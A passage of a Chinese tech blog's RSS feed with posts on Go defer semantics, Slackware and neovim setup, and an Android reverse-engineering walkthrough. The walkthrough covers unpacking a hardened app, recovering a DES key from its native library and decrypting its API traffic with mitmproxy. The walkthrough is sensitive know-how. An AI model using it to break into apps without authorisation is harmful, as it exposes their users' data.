&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>最终输出是&lt;/p>
&lt;pre>&lt;code>close 4!
close 4!
close 4!
close 4!
close 4!
&lt;/code>&lt;/pre>&lt;p>造成这一结果的原因是接收器(receiver)也作为函数参数的一部分在 defer 时被求值。&lt;/p>
&lt;p>&lt;code>for _, conn := range arr&lt;/code> 这一行代码中，&lt;code>conn&lt;/code> 本质是一个局部变量，其内存在循环期间可以视作固定的，而&lt;code>func (c *Conn) Close() error&lt;/code> 接收器取了这个局部变量的地址：每一次循环，调用 Close 时，取得的都是同一个地址。最终导致 Close 的全部都是 conn 在函数结束时最后得到的值。&lt;/p>
&lt;p>类似的，如果把接收器从指针改成值呢？接收器变成了值传递，将&lt;code>conn&lt;/code>复制一次后保留作为 defer 函数执行时的参数，就会有正常的结果。&lt;/p>
&lt;p>但并不是说循环内 defer &lt;strong>一定是&lt;/strong> 不好的。&lt;/p>
&lt;p>比如一个常见的场景，在循环里使用 SQL 查询。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="k">for&lt;/span> &lt;span class="nx">query&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">queries&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">rows&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">db&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Query&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">query&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">defer&lt;/span> &lt;span class="nx">rows&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Close&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以明确知道 &lt;code>rows&lt;/code> 是指针，而且 &lt;code>rows.Close&lt;/code> 有指针接收器，就可以确定不会有问题。&lt;/p>
&lt;h2 id="0x04-defer-和闭包">0x04 defer 和闭包&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kn">package&lt;/span> &lt;span class="nx">main&lt;/span>
&lt;span class="kn">import&lt;/span> &lt;span class="s">&amp;#34;fmt&amp;#34;&lt;/span>
&lt;span class="kd">type&lt;/span> &lt;span class="nx">Conn&lt;/span> &lt;span class="kd">struct&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">ID&lt;/span> &lt;span class="kt">int&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="nf">NewConn&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">id&lt;/span> &lt;span class="kt">int&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">Conn&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">Conn&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">ID&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">id&lt;/span>&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">Conn&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">Close&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="kt">error&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;close %d!\n&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ID&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">conn&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">Conn&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">}&lt;/span>
&lt;span class="k">defer&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="nx">conn&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Close&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">}()&lt;/span>
&lt;span class="nx">conn&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">Conn&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">}&lt;/span>
&lt;span class="k">defer&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="nx">conn&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Close&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">}()&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>和上面类似，这次输出是:&lt;/p>
&lt;pre>&lt;code>close 2!
close 2!
&lt;/code>&lt;/pre>&lt;p>问题出现在 defer 后面这个画蛇添足的 &lt;code>func(){}()&lt;/code> 上。众所周知 defer 会对参数求值，但闭包捕获的变量并不会。&lt;/p>
&lt;p>因此，即使 &lt;code>defer conn.Close()&lt;/code> 工作正常，但 defer &lt;code>defer func() {conn.Close()}()&lt;/code> 就不一定了。两者在部分情况下并不能等价代换，除非你确信了解自己做了什么。&lt;/p>
&lt;p>如果一定要用 &lt;code>func(){}()&lt;/code> 的形式，那么 conn 只能通过参数形式传递给这个匿名函数。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="k">defer&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">conn&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">Conn&lt;/span>&lt;span class="p">){&lt;/span>
&lt;span class="nx">_&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">conn&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Close&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="p">}(&lt;/span>&lt;span class="nx">conn&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>对，说的就是烦人的&lt;em>未处理的错误&lt;/em>警告。&lt;/p>
&lt;h2 id="0x05-happy-hacking">0x05 Happy Hacking!&lt;/h2>
&lt;p>惯例，完。&lt;/p></description></item><item><title>在 slackware 上安装 neovim</title><link>https://nnnewb.github.io/blog/p/%E5%9C%A8-slackware-%E4%B8%8A%E5%AE%89%E8%A3%85-neovim/</link><pubDate>Mon, 04 Jan 2021 15:00:20 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/%E5%9C%A8-slackware-%E4%B8%8A%E5%AE%89%E8%A3%85-neovim/</guid><description>&lt;p>最近在虚拟机里折腾 slackware ，发现 slackware 14.2 的 vim 版本还停留在 7.4 ，于是考虑还是装个 neovim 算了。毕竟升级 vim8 还得自己写 SlackBuild，万一和原本的 vim 7.4 冲突就更头疼了。&lt;/p>
&lt;!-- more -->
&lt;h2 id="0x01-确定依赖">0x01 确定依赖&lt;/h2>
&lt;p>到处翻 slackbuild 之间依赖关系的时候发现 sbopkg 提供了一个解决依赖的脚本，&lt;code>sqg&lt;/code>。&lt;/p>
&lt;p>于是简单点，拿 &lt;code>sqg -p neovim&lt;/code> 生成 neovim 的安装队列 neovim.sqf 文件。&lt;/p>
&lt;p>sqg 和 sbopkg 一起提供了，所以不用另外安装。&lt;/p>
&lt;h2 id="0x02-安装">0x02 安装&lt;/h2>
&lt;p>一条命令：&lt;code>sudo sbopkg -i neovim.sqf&lt;/code>&lt;/p>
&lt;p>然后等完成吧。&lt;/p>
&lt;h2 id="0x03-可选依赖">0x03 可选依赖&lt;/h2>
&lt;p>上述步骤完成后还只是装好基本的 neovim ，但 python2/python3/ruby/nodejs 支持都是没有的。&lt;/p>
&lt;p>打开 nvim，输入命令 &lt;code>:checkhealth&lt;/code> 后会显示缺少支持，同时也提供了解决办法：&lt;code>pip install pynvim&lt;/code>。&lt;/p>
&lt;p>然后就是另一个坑：pip 也不在默认的 python2 包里。于是为了解决这个问题，还得先装上 pip : &lt;code>sudo sbopkg -i python-pip&lt;/code>&lt;/p>
&lt;p>然后执行 &lt;code>sudo pip install pynvim&lt;/code>，此时 python2 支持已经装好。&lt;/p>
&lt;p>不过众所周知 python2 的生命周期已经结束了，python3 才是正道。所以还得装一下 python3 : &lt;code>sudo sbopkg -i python3&lt;/code>&lt;/p>
&lt;p>slackbuild 的 python3 包自带了 pip 所以一切安好。完成后直接装 pynvim 即可: &lt;code>sudo pip3 install pynvim&lt;/code>&lt;/p>
&lt;p>nodejs 和 ruby 不是我的工作语言就不管了。&lt;/p>
&lt;h2 id="0x04-使用-vim-配置">0x04 使用 vim 配置&lt;/h2>
&lt;p>另一个问题是我的 vimrc 配置是针对 vim8 写的，neovim 不认 .vimrc 和 .vim 。这个问题网上有很多解决办法，我复制粘贴下。&lt;/p>
&lt;blockquote>
&lt;p>Transitioning from Vim &lt;em>nvim-from-vim&lt;/em>&lt;/p>
&lt;ol>
&lt;li>
&lt;p>To start the transition, create your |init.vim| (user config) file:&lt;/p>
&lt;p>:call mkdir(stdpath(&amp;lsquo;config&amp;rsquo;), &amp;lsquo;p&amp;rsquo;)
:exe &amp;lsquo;edit &amp;lsquo;.stdpath(&amp;lsquo;config&amp;rsquo;).'/init.vim&amp;rsquo;&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Add these contents to the file:&lt;/p>
&lt;p>set runtimepath^=~/.vim runtimepath+=~/.vim/after
let &amp;amp;packpath = &amp;amp;runtimepath
source ~/.vimrc&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Restart Nvim, your existing Vim config will be loaded.&lt;/p>
&lt;/li>
&lt;/ol>
&lt;/blockquote>
&lt;p>完事即可认出 vim 配置。&lt;/p>
&lt;h2 id="0x05-happy-hacking-">0x05 Happy Hacking !&lt;/h2>
&lt;p>&lt;em>完&lt;/em>&lt;/p></description></item><item><title>slackware 和虚拟机基本配置</title><link>https://nnnewb.github.io/blog/p/slackware-%E5%92%8C%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/</link><pubDate>Wed, 30 Dec 2020 11:11:56 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/slackware-%E5%92%8C%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/</guid><description>&lt;p>slackware 是一个非常有极客味的 Linux 发行版，因为官方维护的包不多，基本靠 slackbuilds 续命。&lt;/p>
&lt;p>slackware 的一个特色是包管理系统不处理依赖关系，这一点劝退不少人。&lt;/p>
&lt;p>实际上，虽然我不是很赞同 &lt;a class="link" href="https://docs.slackware.com/start?id=slackware:package_and_dependency_management_shouldn_t_put_you_off_slackware" target="_blank" rel="noopener"
>这个观点&lt;/a> ，不过并不妨碍 slackware 成为可玩性相对高的 Linux 发行版之一（另外几个可玩性不错的发行版包括 Arch Linux 和 Gentoo）。&lt;/p>
&lt;p>这篇博文实际上就是安利下 slackware 并且简要介绍下怎么在虚拟机里搭建个基本环境来体验游玩。&lt;/p>
&lt;!-- more -->
&lt;h2 id="0x01-安装">0x01 安装&lt;/h2>
&lt;p>安装的参考文档太多了，个人认为主要的难点在分区和引导。毕竟不像其他更流行的发行版的 GUI 安装引导，对 fdisk 和 parted 这些工具不熟悉、对操作系统引导启动的一些基本概念、原理不了解的人很容易犯下错误而不自知。&lt;/p>
&lt;p>这里提供一篇之前在贴吧写的 &lt;a class="link" href="https://tieba.baidu.com/p/4863103375" target="_blank" rel="noopener"
>安装教程&lt;/a> ，不做赘述了。&lt;/p>
&lt;h2 id="0x02-桌面">0x02 桌面&lt;/h2>
&lt;p>对习惯了装完就有桌面的用户来说，安装完 slackware 之后遇到的第一个问题就是怎么进入桌面——甚至会问怎么登陆。&lt;/p>
&lt;p>这里就挂一张 gif 好了。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/slackware-vm-setup/01.gif"
loading="lazy"
alt="01"
>&lt;/p>
&lt;p>假设没手贱在安装的时候把 x/kde/xfce 之类的软件包组给去掉的话，就不会有什么问题。&lt;/p>
&lt;p>如果需要自动进入桌面，需要手动修改 &lt;code>/etc/inittab&lt;/code> 文件，把默认的 runlevel 修改为 4 。&lt;/p>
&lt;p>具体怎么改，看 gif 。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/slackware-vm-setup/02.gif"
loading="lazy"
alt="02"
>&lt;/p>
&lt;h2 id="0x03-slackpkg-包管理">0x03 slackpkg 包管理&lt;/h2>
&lt;p>如果用过 ubuntu ，那么下一个问题可能就是 &amp;ldquo;怎么没有 apt-get 命令？&amp;rdquo; 或者 &amp;ldquo;slackware 用什么命令安装软件？&amp;rdquo;&lt;/p>
&lt;p>答案是有好几个相关命令。&lt;/p>
&lt;ul>
&lt;li>installpkg&lt;/li>
&lt;li>removepkg&lt;/li>
&lt;li>upgradepkg&lt;/li>
&lt;li>makepkg&lt;/li>
&lt;li>explodepkg&lt;/li>
&lt;li>rpm2targz&lt;/li>
&lt;/ul>
&lt;p>大部分命令顾名思义，也不需要额外说明。如果说和 apt 或者 pacman 类似的一个统一的包管理器的话，那就是 slackpkg 。&lt;/p>
&lt;p>使用 slackpkg 之前，需要手动修改 /etc/slackpkg/mirrors 文件，选择一个网络状况比较好的软件源地址，把行开头的 # 号去掉。&lt;/p>
&lt;p>完事之后用命令 &lt;code>slackpkg update&lt;/code> 更新一下本地索引，就可以正常用了。&lt;/p>
&lt;p>常用的命令包括&lt;/p>
&lt;ul>
&lt;li>slackpkg search&lt;/li>
&lt;li>slackpkg file-search&lt;/li>
&lt;li>slackpkg install&lt;/li>
&lt;li>slackpkg install-new&lt;/li>
&lt;li>slackpkg upgrade&lt;/li>
&lt;li>slackpkg upgrade-all&lt;/li>
&lt;/ul>
&lt;p>具体不细说了，看参考链接，或者自己看看 &lt;code>man slackpkg&lt;/code> 或者 &lt;code>slackpkg help&lt;/code>&lt;/p>
&lt;p>此外还有个不常用的，和安装时的 &lt;code>setup&lt;/code> 风格比较类似的工具，&lt;code>pkgtool&lt;/code>。具体可以自己看看命令。&lt;/p>
&lt;h2 id="0x04-slackbuilds">0x04 SlackBuilds&lt;/h2>
&lt;p>用过 Arch Linux 的 AUR 的用户对这种第三方维护的软件包会比较熟悉， SlackBuilds 对这些用户来说就是另一个 AUR 而已。&lt;/p>
&lt;p>不同之处在于，SlackBuilds 需要手动下载脚本和源码，然后自己看 README 再运行编译。&lt;/p>
&lt;p>当然这不是说 SlackBuilds 没有类似 yaourt 或者 yay 之类的自动工具，你可以试试 sbopkg 。&lt;/p>
&lt;p>这里给个简单的例子，用 sbopkg 安装 fbterm 。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/slackware-vm-setup/03.gif"
loading="lazy"
alt="03.gif"
>&lt;/p>
&lt;h2 id="0x05-编写-slackbuilds">0x05 编写 SlackBuilds&lt;/h2>
&lt;p>讲道理，slackware 常用的软件太少，基本全靠 slackbuilds 撑场面。如果 SlackBuilds 上也没有呢？&lt;/p>
&lt;p>那只能自己写吧。&lt;/p>
&lt;p>对于熟悉 bash 脚本的用户来说这不是什么难事。这篇 &lt;a class="link" href="https://slackwiki.com/Writing_A_SlackBuild_Script" target="_blank" rel="noopener"
>HOWTO 文章&lt;/a> 很好地说明了怎么写一个 SlackBuilds 脚本。&lt;/p>
&lt;h2 id="0x06-参与社区">0x06 参与社区&lt;/h2>
&lt;p>slackware 中文社区太小了，或者说根本不存在。&lt;/p>
&lt;p>能聊几句的基本只有贴吧（实际上现在也找不到人了）或者 GitHub 上（slackwarecn 社区也不活跃）。&lt;/p>
&lt;p>如果对 slackware 感兴趣，可以玩一玩，写几个常用软件的 SlackBuilds 脚本什么的。&lt;/p>
&lt;p>就这样吧。&lt;/p></description></item><item><title>一个安卓应用的逆向分析</title><link>https://nnnewb.github.io/blog/p/%E4%B8%80%E4%B8%AA%E5%AE%89%E5%8D%93%E5%BA%94%E7%94%A8%E7%9A%84%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/</link><pubDate>Tue, 29 Dec 2020 14:04:02 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/%E4%B8%80%E4%B8%AA%E5%AE%89%E5%8D%93%E5%BA%94%E7%94%A8%E7%9A%84%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/</guid><description>&lt;p>说起来也不算什么新鲜的东西，现成的工具拼拼凑凑就搞定了，单纯算是点亮了新的技能。&lt;/p>
&lt;p>待破解应用的名字不透露了，避免引火烧身。&lt;/p>
&lt;p>需要准备的工具包括&lt;/p>
&lt;ul>
&lt;li>mumu 模拟器(或者别的什么有 root 权限、能装 xposed 的模拟器)&lt;/li>
&lt;li>FDex2 脱壳&lt;/li>
&lt;li>jadx 反编译 dex 源码&lt;/li>
&lt;li>apktools 拆解 apk&lt;/li>
&lt;li>mitmproxy 中间人拦截网络请求&lt;/li>
&lt;/ul>
&lt;!-- more -->
&lt;h2 id="0x01-目标和方向选择">0x01 目标和方向选择&lt;/h2>
&lt;p>首要的目标是破解这个软件的 api 加密。&lt;/p>
&lt;p>使用 mitmproxy 抓到 https 流量，发现请求体全部是 base64 ，解码发现乱码。基本断定是加密了。&lt;/p>
&lt;blockquote>
&lt;p>mitmproxy 怎么抓 https 流量不多说了，基本流程就是装证书，然后配置代理。能看到有流量进 mitmproxy 就算成功了。&lt;/p>
&lt;p>直接参考 mitmproxy 的文档快一点。&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/Just-crack-an-android-app/01.png"
loading="lazy"
alt="01"
>&lt;/p>
&lt;p>搜了一圈没有什么现成的对这个 App 的破解的文章，于是决定自己动手。&lt;/p>
&lt;h2 id="0x02-解包和脱壳">0x02 解包和脱壳&lt;/h2>
&lt;p>先确认下电脑上装了 JDK 或者 JRE ，没有的话就装好。&lt;/p>
&lt;p>推荐一个 vscode 的插件，&lt;code>apklab&lt;/code>。会帮你装好 jadx 和 apktools / signer 这些工具。&lt;/p>
&lt;p>接下来直接用 &lt;code>apklab&lt;/code> 打开需要破解的 apk 文件。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/Just-crack-an-android-app/02.png"
loading="lazy"
alt="02"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/Just-crack-an-android-app/03.png"
loading="lazy"
alt="03"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/Just-crack-an-android-app/04.png"
loading="lazy"
alt="04"
>&lt;/p>
&lt;p>apklab 会自动用 apktools 和 jadx 完成拆包和反编译。&lt;/p>
&lt;p>然后简单观察&amp;hellip;&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/Just-crack-an-android-app/05.png"
loading="lazy"
alt="05"
>&lt;/p>
&lt;p>应该是被 360 加固了。&lt;/p>
&lt;p>apk 加固的基本原理就是把易被反编译的 java 字节码转译或者加密后保存，运行的时候再释放出来。用过 upx 一类的软件应该会联想到，就是加壳、反调试什么的这一套。&lt;/p>
&lt;p>xposed 提供了一个&lt;a class="link" href="https://api.xposed.info/reference/de/robv/android/xposed/IXposedHookLoadPackage.html" target="_blank" rel="noopener"
>在安卓包加载时设置钩子的机会&lt;/a>，将 ClassLoader Hook 掉，以此获得真正的应用字节码。&lt;/p>
&lt;p>代码看参考资料。&lt;/p>
&lt;p>安装 xposed 框架和 FDex2 之后启动目标应用，即可获得对应的字节码 dex 文件。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/Just-crack-an-android-app/06.png"
loading="lazy"
alt="06"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/Just-crack-an-android-app/07.png"
loading="lazy"
alt="07"
>&lt;/p>
&lt;p>接着把这些 dex 文件复制出来，即可使用 jadx 反编译到 java 了。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">jadx -d out *.dex
&lt;/code>&lt;/pre>&lt;/div>&lt;p>将反编译的结果用 vscode 打开，可以看到目标已经被我们脱干净了。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/Just-crack-an-android-app/08.png"
loading="lazy"
alt="08"
>&lt;/p>
&lt;h2 id="0x03-寻找加解密代码">0x03 寻找加解密代码&lt;/h2>
&lt;p>目标是解密 Api 请求的内容，所以下一步就是找到哪里保存了加密代码。&lt;/p>
&lt;p>幸运的是这个 App 没有做过混淆，完成脱壳后就已经是全身赤裸的站在我们面前了。&lt;/p>
&lt;p>直接在代码里搜索之前我们观察到的 url：&lt;code>index_des.php&lt;/code>，仅有一个结果。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/Just-crack-an-android-app/09.png"
loading="lazy"
alt="09"
>&lt;/p>
&lt;p>相关函数非常短，这个 HTTP 框架我没有使用过，不过从函数名看应该是一个中间件模式，对所有 Web 请求进行加密处理。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/Just-crack-an-android-app/10.png"
loading="lazy"
alt="10"
>&lt;/p>
&lt;p>&lt;code>getOverPost2&lt;/code> 源码如下&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/Just-crack-an-android-app/11.png"
loading="lazy"
alt="11"
>&lt;/p>
&lt;p>从代码里可以得出：&lt;/p>
&lt;ul>
&lt;li>g 的含义是 Get 请求的参数，应该就是 QueryString。函数名 &lt;code>getOverPost2&lt;/code> 字面意义就是把 GET 请求以 POST 方式发送出去。&lt;/li>
&lt;li>p 的含义大概就是 Post 的参数了。&lt;/li>
&lt;li>加密代码在 &lt;code>encryptByte&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>如此看来已经接近终点了，再点开 &lt;code>encryptByte&lt;/code> 的定义&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/Just-crack-an-android-app/12.png"
loading="lazy"
alt="12"
>&lt;/p>
&lt;p>密钥保存在 &lt;code>DesLib.sharedInstance().getAuthKey()&lt;/code> 中。&lt;/p>
&lt;p>接着点开 &lt;code>getAuthKey&lt;/code> 的定义:&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/Just-crack-an-android-app/13.png"
loading="lazy"
alt="13"
>&lt;/p>
&lt;p>&lt;code>native&lt;/code> 关键字一出，得，白高兴了。差点劝退成功。&lt;/p>
&lt;p>还是先看下怎么加密的。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/Just-crack-an-android-app/14.png"
loading="lazy"
alt="14"
>&lt;/p>
&lt;p>再往回翻一下响应解密的代码，免得拆除密钥来又白高兴一场。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/Just-crack-an-android-app/15.png"
loading="lazy"
alt="15"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/Just-crack-an-android-app/16.png"
loading="lazy"
alt="16"
>&lt;/p>
&lt;p>很好，也是 DES 。&lt;/p>
&lt;p>其实到这一步已经基本完成解密了，唯一欠缺的就是密钥。&lt;/p>
&lt;p>抱着试一试的心情，还是找到了 &lt;code>libencry.so&lt;/code> ，用 IDA 打开分析了一下。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/Just-crack-an-android-app/17.png"
loading="lazy"
alt="17"
>&lt;/p>
&lt;p>一通操作猛如虎，结果发现看不懂汇编。=w=&lt;/p>
&lt;p>按下 F5，看看伪代码。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/Just-crack-an-android-app/18.png"
loading="lazy"
alt="18"
>&lt;/p>
&lt;p>还是看不懂。这都调的什么函数&amp;hellip; &lt;code>a1 + 668&lt;/code> 这个蜜汁偏移也不知道是在算什么。&lt;/p>
&lt;p>网上搜索了一圈，说道可以手动改一下函数签名，IDA 就能提示出函数了。试试看。&lt;/p>
&lt;p>先把函数签名纠正&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/Just-crack-an-android-app/19.png"
loading="lazy"
alt="19"
>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/Just-crack-an-android-app/20.png"
loading="lazy"
alt="20"
>&lt;/p>
&lt;p>再关掉类型转换&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/Just-crack-an-android-app/21.png"
loading="lazy"
alt="21"
>&lt;/p>
&lt;p>最终关键代码清晰了很多，看起来就是个直接返回字符串常量的函数。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/Just-crack-an-android-app/22.png"
loading="lazy"
alt="22"
>&lt;/p>
&lt;p>比较具有迷惑性的是上面的 v5-v9，可以看到 v5-v9 地址是增长、连续的，只有 v5 和 v6 有值。v7/v8/v9 都是 0 。而 v5 的地址被用作 &lt;code>NewStringUTF&lt;/code> 函数的参数。查阅 JNI 接口也可以看到这个参数应该是 &lt;code>const char*&lt;/code> 类型。&lt;/p>
&lt;p>所以 &amp;hellip;&lt;/p>
&lt;p>把数值转换成 16 进制再做观察。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/Just-crack-an-android-app/23.png"
loading="lazy"
alt="23"
>&lt;/p>
&lt;p>发现很有规律，每个字节的值都在 ASCII 范围内。于是右键转换成字符串，再按字节序翻转一下，即可得到密钥。&lt;/p>
&lt;p>到此，解密方法的探索已经完成。&lt;/p>
&lt;h2 id="0x04-mitmproxy-解密">0x04 mitmproxy 解密&lt;/h2>
&lt;p>mitmproxy 支持使用 python 脚本扩展，用法很简单就是 &lt;code>mitmweb.exe -s decrypt.py&lt;/code>&lt;/p>
&lt;p>可以参考 mitmproxy 的&lt;a class="link" href="https://github.com/mitmproxy/mitmproxy/blob/master/examples/addons/contentview.py" target="_blank" rel="noopener"
>例子&lt;/a>&lt;/p>
&lt;p>最终效果应该是这样&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/Just-crack-an-android-app/25.png"
loading="lazy"
alt="24"
>&lt;/p>
&lt;p>核心的解密代码就一句，利用 mitmproxy 的扩展即可对每个请求进行统一的处理。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pyDes&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">des&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PAD_PKCS5&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="nf">decrypt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">Union&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nb">str&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">bytes&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">-&amp;gt;&lt;/span> &lt;span class="nb">bytes&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">des&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">key&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decrypt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">padmode&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">PAD_PKCS5&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="0x05-结语">0x05 结语&lt;/h2>
&lt;p>这个破解的最大意义还是完成了一次完整的安卓逆向，算是点亮了新技能。&lt;/p>
&lt;p>以后再遇到一些傻逼软件或者强制推广的东西就可以用这一手技能来研究吐槽下都什么傻逼代码了。&lt;/p>
&lt;p>当然非法的事情是不可能做的。&lt;/p>
&lt;p>这玩意儿破解完之后发现有泄露隐私、被脱裤的严重漏洞，我也给市政平台发了件。&lt;/p>
&lt;p>所以明年如果再硬推一次的话，到时候再拆了看看是不是有点长进。当然，没人管应该才是常态。&lt;/p></description></item><item><title>在C++中嵌入Python解释器</title><link>https://nnnewb.github.io/blog/p/%E5%9C%A8c-%E4%B8%AD%E5%B5%8C%E5%85%A5python%E8%A7%A3%E9%87%8A%E5%99%A8/</link><pubDate>Fri, 07 Feb 2020 21:59:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/%E5%9C%A8c-%E4%B8%AD%E5%B5%8C%E5%85%A5python%E8%A7%A3%E9%87%8A%E5%99%A8/</guid><description>&lt;p>先不说废话，项目地址：https://github.com/nnnewb/CQPy 。欢迎给个 Star 什么的。&lt;/p>
